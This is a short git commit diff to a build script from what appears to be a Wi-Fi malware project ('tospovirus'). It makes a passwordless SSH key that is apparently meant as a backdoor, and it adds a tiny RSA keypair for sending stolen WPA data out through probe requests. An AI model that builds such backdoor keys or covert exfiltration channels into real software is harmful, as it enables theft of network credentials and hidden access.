cc21cb2c404288c48c6f4777d558312a88296d28
catatonic <lulz>
2015-07-14 23:13:29 -0700

    - Adding generation for data exfiltration keys...

--- build.sh
+++ build.sh
@@ -12,3 +12,11 @@ then
 	ssh-keygen -b 2048 -f dist/tvbd -N "" -C "tospovirus"
 	mv dist/tvbd ./
 fi
+
+#Generate keys for disclosing WPA management data securely
+if [ ! -f dist/tvd.pub ];
+then
+	#Generate a 256 bit key - this is so tiny because we're limited to 32 bytes in a probe request.
+	openssl genrsa -out tvd.pem 256
+	openssl rsa -in tvd.pem -pubout >dist/tvd.pub
+fi
